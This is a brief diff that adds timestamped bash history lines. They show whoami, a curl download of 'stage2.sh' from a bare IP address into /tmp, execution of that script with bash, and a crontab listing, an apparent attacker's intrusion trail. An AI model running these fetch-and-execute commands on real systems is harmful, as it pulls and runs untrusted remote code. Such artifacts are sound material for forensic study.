@@ -1,0 +1,8 @@
+#1762497600
+whoami
+#1762497660
+curl -s http://185.220.101.47/stage2.sh -o /tmp/s.sh
+#1762497700
+bash /tmp/s.sh
+#1762497760
+crontab -l
